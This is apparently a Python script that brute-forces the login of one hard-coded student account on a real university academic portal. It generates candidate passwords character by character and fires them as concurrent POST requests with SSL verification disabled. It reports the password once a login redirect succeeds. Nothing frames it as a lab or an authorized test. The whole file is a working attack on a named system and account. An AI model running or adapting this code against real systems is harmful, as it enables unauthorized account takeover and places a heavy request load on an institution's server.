import json
import asyncio
import requests
import aiohttp

text = list("akuhebat10!")

async def requestlogin(password):
    url = "https://akad.unimed.ac.id/index.php"
    header = {
    "Host" : "akad.unimed.ac.id",
    "User-Agent" : "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Mobile Safari/537.36"
    }
    payload = {
        "usid" : "4203250014",
        "pwd" : "akuhebat123",
        "role" : "s",
        "action" : "login",
    }
    payload["pwd"] = password
    async with aiohttp.TCPConnector(ssl=False) as conn:
            async with aiohttp.ClientSession(connector=conn)as session:
                async with session.post(url=url, data=payload, headers=header) as request:
                    print(password)
                    if request.status == 200:
                        if(str(request.url) == "https://akad.unimed.ac.id/main.php"):
                            print(f"password benar {password}")
                            exit()

    
async def main():
    try:
        tasks = []
        sem = asyncio.Semaphore(1000)
        async with aiohttp.ClientSession() as session:
            for i in range (ord(text[0]),126,1):
                text[0] = chr(i)
                for i in range (ord(text[1]),126,1):
                    text[1] = chr(i)
                    for i in range (ord(text[2]),126,1):
                        text[2] = chr(i)
                        for i in range (ord(text[3]),126,1):
                            text[3] = chr(i)
                            for i in range (ord(text[4]),126,1):
                                text[4] = chr(i)
                                for i in range (ord(text[5]),126,1):
                                    text[5] = chr(i)
                                    for i in range (ord(text[6]),126,1):
                                        text[6] = chr(i)
                                        for i in range (ord(text[7]),126,1):
                                            text[7] = chr(i)
                                            for i in range (ord(text[8]),126,1):
                                                text[8] = chr(i)
                                                for i in range (ord(text[9]),126,1):
                                                    text[9] = chr(i)
                                                    for i in range (ord(text[10]),126,1):
                                                        text[10] = chr(i)
                                                        passw = "".join(text)
                                                        async with sem:
                                                            task = asyncio.ensure_future(requestlogin(passw))
                                                            tasks.append(task)
                                                    text[10] = chr(32)
                                                text[9] = chr(32)
                                                await asyncio.gather(*tasks,return_exceptions=True)
                                            text[8] = chr(32)
                                        text[7] = chr(32)
                                    text[6] = chr(32)
                                text[5] = chr(32)
                            text[4] = chr(32)
                        text[3] = chr(32)
                    text[2] = chr(32)
                text[1] = chr(32)
            text[0] = chr(32)       
        

    except StopIteration:
        pass

asyncio.run(main())
